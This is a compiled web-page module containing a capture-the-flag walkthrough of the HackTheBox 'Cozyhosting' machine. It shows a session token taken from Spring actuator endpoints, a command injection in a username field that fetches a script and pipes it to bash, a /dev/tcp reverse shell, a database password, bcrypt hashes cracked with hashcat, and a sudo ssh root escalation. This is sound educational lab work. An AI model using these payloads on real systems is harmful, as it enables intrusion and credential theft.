import { c as create_ssr_component } from "./ssr.js";
const metadata = {
  "title": "Cozyhosting",
  "description": "A very simple HTB seasonal.",
  "author": "hackthebox",
  "date": "2023-09-04",
  "published": true
};
const Cozyhosting = create_ssr_component(($$result, $$props, $$bindings, slots) => {
  return `<h1 data-svelte-h="svelte-5wb6mz">Cozyhosting</h1> <aside data-svelte-h="svelte-zmxn8p">üëª A very simple HTB seasonal.</aside> <h2 data-svelte-h="svelte-12cw1wm">Reconnaissance</h2> <p data-svelte-h="svelte-qf3jqm">We can run <code>rustscan</code> to enumerate open ports. Here, we return hits for <code>80</code> (<code>http</code>) and <code>22ssh</code>), which is fairly run-of-the-mill for a server hosting some kind of webapp.</p> <h3 data-svelte-h="svelte-1fvxgg3">HTTP service</h3> <p data-svelte-h="svelte-19tm8j">A quick look over the HTTP service on port 80, we see it responds with a <code>Whitelabel Error Page</code> when encountering any non-2xx status code.</p> <p data-svelte-h="svelte-1pg4q3f"><img src="/img/cozyhosting_img/whitelabel_error.png" alt="whitelabel_error.png"></p> <p data-svelte-h="svelte-qnvfbc">A quick google search for this indicates that we are being shown a default error page for the <code>Spring Boot</code> framework.</p> <p data-svelte-h="svelte-9k151d"><img src="/img/cozyhosting_img/spring.png" alt="spring.png"></p> <p data-svelte-h="svelte-1k008wl"><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators" rel="nofollow">The Spring framework has <code>Actuator</code> endpoints</a> - intended for debugging purposes - though we can gather a lot of useful information (or even vulnerability-dependent code execution) if they are available to us.  The <code>/actuator</code> route tells us that a handful of debugging endpoints are enabled, and we‚Äôre able to access <em>most</em> of them.</p> <p data-svelte-h="svelte-1cb7lh9"><img src="/img/cozyhosting_img/actuator_dir.png" alt="actuator_dir.png"></p> <p data-svelte-h="svelte-1in4kss">Enumerating each endpoint meant simply navigating to the URI, looking over the content, and trying to utilize any relevant information in some kind of request. This strategy seems like it was the best route here, as trying to write a script to automate keyword collection or something would likely be far less efficient.</p> <p data-svelte-h="svelte-10m29jz">We wind up on the <code>/actuator/mappings</code> endpoint (which displays a list of directories), where we notice a route to a ‚Äòsessions‚Äô endpoint - this might display a list of logged in users, for example.</p> <p data-svelte-h="svelte-7ogjad"><img src="/img/cozyhosting_img/mappings.png" alt="mappings.png"></p> <h2 data-svelte-h="svelte-1ig9bwk">Initial access</h2> <p data-svelte-h="svelte-12tgpjd">On this actuator endpoint, rather than getting *<strong>*just**</strong> usernames, we are given what is likely a session token for a user named <code>kanderson</code></p> <p data-svelte-h="svelte-7agjjv"><img src="/img/cozyhosting_img/sessions.png" alt="sess"></p> <p data-svelte-h="svelte-1v3hmrt">I‚Äôd already replaced my assigned cookie with <code>kanderson</code>‚Äôs in chrome, but you get the idea</p> <p data-svelte-h="svelte-1t4zujf">Impersonating <code>kanderson</code>, we can go back to the login page and refresh it to be redirected to the admin dashboard. Here we see an automatic patching tool for an <code>ssh</code> service.</p> <p data-svelte-h="svelte-djgclt"><img src="/img/cozyhosting_img/admin-panel.png" alt="admin-panel.png"></p> <p data-svelte-h="svelte-12b8xjm">Trying to create a direct connection back to our machine throws a timeout error, even with <code>sshd</code> running - maybe on account of a private key mismatch (though it was probably not intended to ever <em>actually</em> function considering it was purpose-built for a CTF), but we can tell from the error URL parameters that the app is running <code>ssh</code> commands directly from a shell:</p> <p data-svelte-h="svelte-z7tfu6"><img src="/img/cozyhosting_img/ssh-params.png" alt="ssh-params"></p> <p data-svelte-h="svelte-x0ba6e">Strings from a <code>ssh</code> shell error</p> <p data-svelte-h="svelte-yzvlfb"><img src="/img/cozyhosting_img/redirect-showing-bash.png" alt="redirect"></p> <p data-svelte-h="svelte-nf1orm">Confirmed by the error output, which contains the entire output of a <code>ssh</code> error</p> <h2 data-svelte-h="svelte-1ypel6s">Execution</h2> <p data-svelte-h="svelte-16p9fh4">So it would seem that not only are we executing a direct command onto the target system, but the automatic patching tool also doesn‚Äôt escape malicious strings. It <em>does</em> execute our input prepended with <code>ssh</code>, but this is pretty trivial to bypass.</p> <p data-svelte-h="svelte-wvg04p">The solution I used here was to write a reverse shell script to a file and serve it over a python <code>http.server</code>. We can then <code>curl</code> its contents from the CMS, and finally pipe to bash to execute it.</p> <p data-svelte-h="svelte-14s9rm5">This was slightly trickier than simply writing this as a URL-safe sequence, as character encoding like <code>%20</code> or <code>+</code> broke our commands upon reaching the shell, but we can use the  shell variable<code>\${IFS}</code> to determine input field separation, which yields our desired word separator here.</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token assign-left variable">host</span><span class="token operator">=</span>n<span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>%3bcurl<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token operator">&lt;</span>http://10.10.14.40:9990/hello.sh<span class="token operator">|</span>/bin/bash%3b<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token operator">></span></code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1c20q22"><code>$ cat hello.sh</code></p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/10.10.14.40/9999 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code>`}<!-- HTML_TAG_END --></pre> <blockquote data-svelte-h="svelte-rqcm09"><p>Note that this method could probably be simplified; this is just what wound up working for me in the moment.</p></blockquote> <p data-svelte-h="svelte-1qnayw0"><img src="/img/cozyhosting_img/reverse-shell-success.png" alt="reverse-shell-success"></p> <p data-svelte-h="svelte-10rcktw">We can copy the <code>.jar</code> file from the remote machine to ours to browse it‚Äôs filesystem; I assume this is what the HTTP service uses as its designated file system (Spring Boot is a Java-based application), though I‚Äôve never developed web services with Java, though <code>JAR</code>, being a contraction of ‚ÄúJava archive‚Äù, can be extracted with an archive utility into a (partially) readable filesystem - though we aren‚Äôt performing a decompilation, so we won‚Äôt get 100% readable source.</p> <p data-svelte-h="svelte-4eozmr">Regardless, we will download and extract the archive:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$ <span class="token function">ls</span> <span class="token parameter variable">-la</span>
total <span class="token number">58856</span>
drwxr-xr-x  <span class="token number">2</span> root root     <span class="token number">4096</span> Aug <span class="token number">14</span> <span class="token number">14</span>:11 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root root     <span class="token number">4096</span> Aug <span class="token number">14</span> <span class="token number">14</span>:11 <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">60259688</span> Aug <span class="token number">11</span> 00:45 cloudhosting-0.0.1.jar
<span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$
<span class="token punctuation">(</span>local<span class="token punctuation">)</span> pwncat$ download cloudhosting-0.0.1.jar <span class="token builtin class-name">.</span>
cloudhosting-0.0.1.jar <span class="token punctuation">..</span>. <span class="token number">100.0</span>% ‚Ä¢ <span class="token number">60.3</span>/60.3 MB ‚Ä¢ <span class="token number">2.3</span> MB/s ‚Ä¢ <span class="token number">0</span>:00:00<span class="token punctuation">[</span>06:55:08<span class="token punctuation">]</span> downloaded <span class="token number">60</span>.26MiB <span class="token keyword">in</span> <span class="token number">27.64</span> seconds</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-1qrel61">Going through them by hand, the files within are <em>mostly</em> readable as is - enough to see Postgres credentials in the <code>application.properties</code> file, at least:</p> <pre class="language-toml"><!-- HTML_TAG_START -->${`<code class="language-toml"><span class="token key property">server.address</span><span class="token punctuation">=</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span>
<span class="token key property">server.servlet.session.timeout</span><span class="token punctuation">=</span>5m
<span class="token key property">management.endpoints.web.exposure.include</span><span class="token punctuation">=</span>health<span class="token punctuation">,</span>beans<span class="token punctuation">,</span>env<span class="token punctuation">,</span>sessions<span class="token punctuation">,</span>mappings
<span class="token key property">management.endpoint.sessions.enabled</span><span class="token punctuation">=</span><span class="token boolean">true</span>
<span class="token key property">spring.datasource.driver-class-name</span><span class="token punctuation">=</span>org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>Driver
<span class="token key property">spring.jpa.database-platform</span><span class="token punctuation">=</span>org<span class="token punctuation">.</span>hibernate<span class="token punctuation">.</span>dialect<span class="token punctuation">.</span>PostgreSQLDialect
<span class="token key property">spring.jpa.hibernate.ddl-auto</span><span class="token punctuation">=</span>none
<span class="token key property">spring.jpa.database</span><span class="token punctuation">=</span>POSTGRESQL
<span class="token key property">spring.datasource.platform</span><span class="token punctuation">=</span>postgres
<span class="token key property">spring.datasource.url</span><span class="token punctuation">=</span>jdbc:postgresql://localhost:<span class="token number">5432</span>/cozyhosting
<span class="token key property">spring.datasource.username</span><span class="token punctuation">=</span>postgres
<span class="token key property">spring.datasource.password</span><span class="token punctuation">=</span>Vg&amp;nvzAQ7XxR
</code>`}<!-- HTML_TAG_END --></pre> <h2 data-svelte-h="svelte-12ouyou">Privilege escalation</h2> <p data-svelte-h="svelte-nbz4js">Going back to our <code>ssh</code> session, we can connection to the Postgresql database to see what might be available to us. I‚Äôve never used Postgres like this before, so it was a little cursed, but I ultimately got there:</p> <p data-svelte-h="svelte-dy1k4f"><code>$ (remote) app@cozyhosting:/app$ psql -h localhost -U postgres</code></p> <pre class="language-sql"><!-- HTML_TAG_START -->${`<code class="language-sql">postgres<span class="token operator">=</span><span class="token comment"># \\\\list</span>
                                   List <span class="token keyword">of</span> <span class="token keyword">databases</span>
    Name     <span class="token operator">|</span>  Owner   <span class="token operator">|</span> Encoding <span class="token operator">|</span>   <span class="token keyword">Collate</span>   <span class="token operator">|</span>    Ctype    <span class="token operator">|</span>   Access <span class="token keyword">privileges</span>
<span class="token comment">-------------+----------+----------+-------------+-------------+-----------------------</span>
 cozyhosting <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span>
 postgres    <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span>
 template0   <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token operator">=</span>c<span class="token operator">/</span>postgres          <span class="token operator">+</span>
             <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>             <span class="token operator">|</span>             <span class="token operator">|</span> postgres<span class="token operator">=</span>CTc<span class="token operator">/</span>postgres
 template1   <span class="token operator">|</span> postgres <span class="token operator">|</span> UTF8     <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> en_US<span class="token punctuation">.</span>UTF<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">|</span> <span class="token operator">=</span>c<span class="token operator">/</span>postgres          <span class="token operator">+</span>
             <span class="token operator">|</span>          <span class="token operator">|</span>          <span class="token operator">|</span>             <span class="token operator">|</span>             <span class="token operator">|</span> postgres<span class="token operator">=</span>CTc<span class="token operator">/</span>postgres
<span class="token punctuation">(</span><span class="token number">4</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

postgres<span class="token operator">=</span><span class="token comment"># \\\\c cozyhosting</span>
SSL connection <span class="token punctuation">(</span>protocol: TLSv1<span class="token punctuation">.</span><span class="token number">3</span><span class="token punctuation">,</span> cipher: TLS_AES_256_GCM_SHA384<span class="token punctuation">,</span> bits: <span class="token number">256</span><span class="token punctuation">,</span> compression: <span class="token keyword">off</span><span class="token punctuation">)</span>
You are now connected <span class="token keyword">to</span> <span class="token keyword">database</span> <span class="token string">"cozyhosting"</span> <span class="token keyword">as</span> <span class="token keyword">user</span> <span class="token string">"postgres"</span><span class="token punctuation">.</span>
cozyhosting<span class="token operator">=</span><span class="token comment"># \\\\d</span>
              List <span class="token keyword">of</span> relations
 <span class="token keyword">Schema</span> <span class="token operator">|</span>     Name     <span class="token operator">|</span>   <span class="token keyword">Type</span>   <span class="token operator">|</span>  Owner
<span class="token comment">--------+--------------+----------+----------</span>
 <span class="token keyword">public</span> <span class="token operator">|</span> hosts        <span class="token operator">|</span> <span class="token keyword">table</span>    <span class="token operator">|</span> postgres
 <span class="token keyword">public</span> <span class="token operator">|</span> hosts_id_seq <span class="token operator">|</span> sequence <span class="token operator">|</span> postgres
 <span class="token keyword">public</span> <span class="token operator">|</span> users        <span class="token operator">|</span> <span class="token keyword">table</span>    <span class="token operator">|</span> postgres
<span class="token punctuation">(</span><span class="token number">3</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

cozyhosting<span class="token operator">=</span><span class="token comment"># SELECT password FROM users;</span>
                           password
<span class="token comment">--------------------------------------------------------------</span>
 $<span class="token number">2</span>a$<span class="token number">10</span>$E<span class="token operator">/</span>Vcd9ecflmPudWeLSEIv<span class="token punctuation">.</span>cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
 $<span class="token number">2</span>a$<span class="token number">10</span>$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
<span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>

cozyhosting<span class="token operator">=</span><span class="token comment"># SELECT name FROM users;</span>
   name
<span class="token comment">-----------</span>
 kanderson
 admin
<span class="token punctuation">(</span><span class="token number">2</span> <span class="token keyword">rows</span><span class="token punctuation">)</span>
</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-7aznp1">That looks like a <code>bcrypt</code> hash, so I will run it through <code>hashcat</code> against <code>rockyou</code>.</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">3200</span>  <span class="token punctuation">..</span>/bcrypt-cozy.txt <span class="token punctuation">..</span>/rockyou.txt

<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">49</span> MB

Dictionary cache built:
* Filename<span class="token punctuation">..</span>: <span class="token punctuation">..</span>/rockyou.txt
* Passwords.: <span class="token number">14344394</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139922213</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344387</span>
* Runtime<span class="token punctuation">..</span>.: <span class="token number">0</span> secs

<span class="token variable">$2a</span><span class="token variable">$10</span><span class="token variable">$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm</span>:manchesterunited

Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">3200</span> <span class="token punctuation">(</span>bcrypt <span class="token variable">$2</span>*$, Blowfish <span class="token punctuation">(</span>Unix<span class="token punctuation">))</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$2a</span><span class="token variable">$10</span><span class="token variable">$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib</span><span class="token punctuation">..</span>.kVO8dm
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Tue Sep 05 07:20:52 <span class="token number">2023</span> <span class="token punctuation">(</span><span class="token number">5</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Tue Sep 05 07:20:57 <span class="token number">2023</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span><span class="token punctuation">..</span>/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:      504 H/s (5.31ms) @ Accel:2 Loops:8 Thr:12 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">2880</span>/14344387 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/2880 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">2520</span>/14344387 <span class="token punctuation">(</span><span class="token number">0.02</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: biscuit -> soccer9</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 51c Fan: 19% Util: 97% Core:1923MHz Mem:4006MHz Bus:16</span>

Started: Tue Sep 05 07:20:44 <span class="token number">2023</span>
Stopped: Tue Sep 05 07:20:59 <span class="token number">2023</span>
</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-tx3vfy">So our gathered credentials from the database are <code>admin</code>:<code>manchesterunited</code> .</p> <h3 data-svelte-h="svelte-6ag4bk"><code>user.txt</code></h3> <p data-svelte-h="svelte-14xqi2l">I didn‚Äôt include a screenshot/terminal output of this, but checking other <code>ssh</code> users with <code>$ cat /etc/passwd</code> shows <code>josh</code> as the second user, so we can infer that the <code>admin</code> user is probably .</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token assign-left variable">cozyhosting</span><span class="token operator">=</span><span class="token comment"># exit</span>
could not save <span class="token function">history</span> to <span class="token function">file</span> <span class="token string">"/home/app/.psql_history"</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory
<span class="token punctuation">(</span>remote<span class="token punctuation">)</span> app@cozyhosting:/app$ <span class="token function">su</span> josh
Password:
josh@cozyhosting:/app$ <span class="token builtin class-name">cd</span> ~
josh@cozyhosting:~$ <span class="token function">ls</span>
user.txt
josh@cozyhosting:~$ <span class="token function">cat</span> user.txt
7d21d6bcbd68d25a92908bf5290b1a69</code>`}<!-- HTML_TAG_END --></pre> <h3 data-svelte-h="svelte-17s0qqz"><code>root.txt</code></h3> <p data-svelte-h="svelte-192atu4">Finally, lets see what privilege escalation options might be available to us before enumerating with <code>linpeas.sh</code>:</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> josh@cozyhosting:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> josh:
Matching Defaults entries <span class="token keyword">for</span> josh on localhost:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/local/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/usr/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/sbin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/bin<span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span><span class="token punctuation"></span>:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/ssh *
</code>`}<!-- HTML_TAG_END --></pre> <p data-svelte-h="svelte-wkyob8">As we can run the <code>ssh</code> binary as <code>root</code> with sudo, we can use a pretty simple payload from <code>gtfobins</code> to grab our final flag.</p> <pre class="language-bash"><!-- HTML_TAG_START -->${`<code class="language-bash"><span class="token punctuation">(</span>remote<span class="token punctuation">)</span> josh@cozyhosting:/tmp$ <span class="token function">sudo</span> <span class="token function">ssh</span> <span class="token parameter variable">-o</span> <span class="token assign-left variable">ProxyCommand</span><span class="token operator">=</span><span class="token string">';sh 0&lt;&amp;2 1>&amp;2'</span> x
<span class="token comment"># whoami</span>
root
<span class="token comment"># cat /root/root.txt</span>
<span class="token number">0</span>******************************6
<span class="token comment">#</span>
</code>`}<!-- HTML_TAG_END --></pre>`;
});
export {
  Cozyhosting as default,
  metadata
};
